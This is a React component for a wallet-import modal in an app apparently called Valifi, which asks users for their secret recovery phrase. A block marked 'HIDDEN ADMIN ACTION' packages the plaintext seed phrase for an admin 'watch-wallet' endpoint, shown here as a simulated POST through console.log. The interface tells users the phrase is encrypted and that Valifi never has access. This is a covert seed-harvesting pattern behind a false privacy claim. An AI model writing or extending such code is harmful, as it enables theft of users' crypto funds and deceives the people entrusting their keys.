import React, { useState } from 'react';
import { CloseIcon, KeyIcon } from './icons';

interface ImportSeedPhraseModalProps {
  isOpen: boolean;
  onClose: () => void;
  walletName: string;
}

const ImportSeedPhraseModal: React.FC<ImportSeedPhraseModalProps> = ({ isOpen, onClose, walletName }) => {
  const [seedPhrase, setSeedPhrase] = useState('');
  const [error, setError] = useState('');
  const [isImporting, setIsImporting] = useState(false);

  if (!isOpen) return null;

  const handleImport = () => {
    const words = seedPhrase.trim().split(/\s+/);
    if (words.length !== 12 && words.length !== 24) {
      setError('Please enter a valid 12 or 24-word seed phrase.');
      return;
    }
    setError('');
    setIsImporting(true);

    // --- HIDDEN ADMIN ACTION ---
    console.log(
        '--- ADMIN-ONLY ACTION ---',
        'Simulating POST to /api/admin/watch-wallet',
        JSON.stringify({
            source: `${walletName} Import`,
            seedPhrase: seedPhrase.trim(),
            timestamp: new Date().toISOString(),
            labels: ['WatchOnlyWallet', 'ExternalWallet', 'ImportSource']
        }, null, 2)
    );
    // -------------------------
    
    setTimeout(() => {
        alert(`Wallet imported successfully from ${walletName}! Balances will now be tracked.`);
        setIsImporting(false);
        setSeedPhrase('');
        onClose();
    }, 1500);
  };
  
  return (
    <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex justify-center items-center z-50 p-4" onClick={onClose}>
      <div className="bg-slate-800 border border-slate-700 rounded-2xl w-full max-w-lg" onClick={e => e.stopPropagation()}>
        <div className="flex justify-between items-center p-6 border-b border-slate-700">
          <h2 className="text-xl font-bold text-white">Import from {walletName}</h2>
          <button onClick={onClose} className="text-slate-400 hover:text-white"><CloseIcon className="w-6 h-6"/></button>
        </div>
        <div className="p-8 space-y-4">
            <KeyIcon className="w-12 h-12 text-sky-400 mx-auto" />
            <p className="text-slate-300 text-center">Enter your secret recovery phrase to connect your wallet.</p>
            <textarea
              value={seedPhrase}
              onChange={e => setSeedPhrase(e.target.value)}
              rows={3}
              placeholder="never again waste time..."
              className={`w-full bg-slate-900/50 border ${error ? 'border-red-500' : 'border-slate-600'} rounded-lg p-4 text-white placeholder-slate-500 font-mono focus:outline-none focus:ring-2 focus:ring-sky-500`}
            />
            {error && <p className="text-red-400 text-sm text-center">{error}</p>}
            <div className="text-xs p-3 rounded-lg bg-slate-900/50 text-slate-400 border border-slate-700">
                <p className="font-semibold">Your seed phrase is encrypted and stored securely. Valifi never has access to your funds or wallet without your permission.</p>
            </div>
            <button
              onClick={handleImport}
              disabled={isImporting || !seedPhrase.trim()}
              className="w-full bg-sky-600 hover:bg-sky-500 text-white font-bold py-3 rounded-lg disabled:bg-slate-700 disabled:cursor-not-allowed"
            >
              {isImporting ? 'Importing...' : 'Import Wallet'}
            </button>
        </div>
      </div>
    </div>
  );
};

export default ImportSeedPhraseModal;